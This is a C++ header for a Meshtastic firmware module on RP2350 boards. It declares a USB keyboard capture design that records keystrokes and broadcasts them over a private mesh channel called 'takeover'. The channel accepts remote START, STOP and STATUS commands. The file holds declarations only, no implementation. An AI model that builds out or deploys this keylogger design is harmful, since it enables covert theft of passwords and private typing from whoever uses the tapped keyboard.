/**
 * @file USBCaptureModule.h
 * @brief USB keyboard capture module for Meshtastic (RP2350 only)
 *
 * This module captures USB keyboard keystrokes using PIO on Core 1 and
 * makes them available to Core 0 for mesh transmission. Implements proper
 * Meshtastic Module API for remote control and status queries.
 *
 * Architecture:
 *  - Inherits from SinglePortModule for mesh message handling
 *  - Inherits from OSThread for periodic USB capture operations
 *  - Uses PRIVATE_APP port (256) for control messages
 *  - Core1: USB capture via PIO → PSRAM ring buffer
 *  - Core0: PSRAM polling → mesh transmission + message handling
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#pragma once

#include "../mesh/SinglePortModule.h"
#include "../platform/rp2xx0/usb_capture/keystroke_queue.h"
#include "../platform/rp2xx0/usb_capture/formatted_event_queue.h"
#include "../platform/rp2xx0/usb_capture/common.h"
#include "concurrency/OSThread.h"
/**
 * @brief Keystroke buffer configuration
 */
#define KEYSTROKE_BUFFER_SIZE     500
#define EPOCH_SIZE                10
#define DELTA_SIZE                2
#define DELTA_MARKER              0xFF
#define DELTA_TOTAL_SIZE          3       /* marker + 2-byte delta */
#define DELTA_MAX_SAFE            65000
#define KEYSTROKE_DATA_START      EPOCH_SIZE
#define KEYSTROKE_DATA_END        (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)

/**
 * @brief USB Capture Module command types (sent via mesh packets)
 *
 * Simple text-based protocol for easy testing and debugging.
 * Commands are case-insensitive ASCII strings.
 */
enum USBCaptureCommand {
    CMD_UNKNOWN = 0,
    CMD_STATUS,      // "STATUS" - Get module status (enabled, buffer stats)
    CMD_START,       // "START"  - Start USB capture
    CMD_STOP,        // "STOP"   - Stop USB capture
    CMD_STATS,       // "STATS"  - Get detailed statistics
};

/**
 * @brief USB Capture Module for RP2350
 *
 * Hybrid architecture combining:
 *  1. SinglePortModule: Mesh message handling for remote control
 *  2. OSThread: Periodic USB capture and buffer processing
 *
 * Features:
 *  - Remote start/stop capture via mesh
 *  - Remote status and statistics queries
 *  - Automatic keystroke broadcasting
 *  - Multi-core architecture (Core0: mesh, Core1: capture)
 *
 * Message Protocol:
 *  - Port: TEXT_MESSAGE_APP (1)
 *  - Channel: "takeover" (channel index 1)
 *  - Encoding: ASCII text commands
 *  - Commands: STATUS, START, STOP, STATS
 *  - Responses: ASCII text with status information
 */
class USBCaptureModule : public SinglePortModule, public concurrency::OSThread
{
  public:
    /**
     * @brief Constructor
     * Initializes both SinglePortModule (for mesh) and OSThread (for periodic ops)
     */
    USBCaptureModule();

    /**
     * @brief Initialize the module
     * Sets up USB capture hardware and launches Core1
     * @return true if initialization successful
     */
    bool init();

  protected:
    // ==================== MeshModule Interface ====================

    /**
     * @brief Handle received mesh packets
     * Processes remote control commands (STATUS, START, STOP, STATS)
     *
     * @param mp Received mesh packet
     * @return ProcessMessage::STOP if handled, CONTINUE otherwise
     */
    virtual ProcessMessage handleReceived(const meshtastic_MeshPacket &mp) override;

    /**
     * @brief Generate reply to received command
     * Called automatically when want_response flag is set
     *
     * @return Allocated reply packet with status/response
     */
    virtual meshtastic_MeshPacket *allocReply() override;

    // ==================== OSThread Interface ====================

    /**
     * @brief Main loop - runs on Core 0 periodically
     * Handles PSRAM buffer processing and mesh transmission
     *
     * @return Update interval in milliseconds (100ms)
     */
    virtual int32_t runOnce() override;

  private:
    // ==================== Core State ====================

    keystroke_queue_t *keystroke_queue;
    formatted_event_queue_t *formatted_queue;
    capture_controller_t controller;
    bool core1_started;
    bool capture_enabled;  // Can be toggled via mesh commands

    // ==================== Command Processing ====================

    /**
     * @brief Parse command from mesh packet payload
     * @param payload Command string (ASCII)
     * @param len Payload length
     * @return Parsed command type
     */
    USBCaptureCommand parseCommand(const uint8_t *payload, size_t len);

    /**
     * @brief Execute received command
     * @param cmd Command to execute
     * @param response Buffer for response text
     * @param max_len Maximum response buffer size
     * @return Length of response text
     */
    size_t executeCommand(USBCaptureCommand cmd, char *response, size_t max_len);

    /**
     * @brief Get current module status
     * @param response Buffer for status text
     * @param max_len Maximum buffer size
     * @return Length of status text
     */
    size_t getStatus(char *response, size_t max_len);

    /**
     * @brief Get detailed statistics
     * @param response Buffer for stats text
     * @param max_len Maximum buffer size
     * @return Length of stats text
     */
    size_t getStats(char *response, size_t max_len);

    // ==================== USB Capture Operations ====================

    /**
     * @brief Process PSRAM buffers and transmit them
     * Core0's main responsibility - read complete buffers from PSRAM and transmit
     *
     * Called from runOnce() every 100ms
     */
    void processPSRAMBuffers();

    /**
     * @brief Broadcast buffer data over the private "takeover" channel
     * @param data Pointer to data buffer
     * @param len Length of data to send
     * @return true if packet was queued successfully
     */
    bool broadcastToPrivateChannel(const uint8_t *data, size_t len);
};

extern USBCaptureModule *usbCaptureModule;
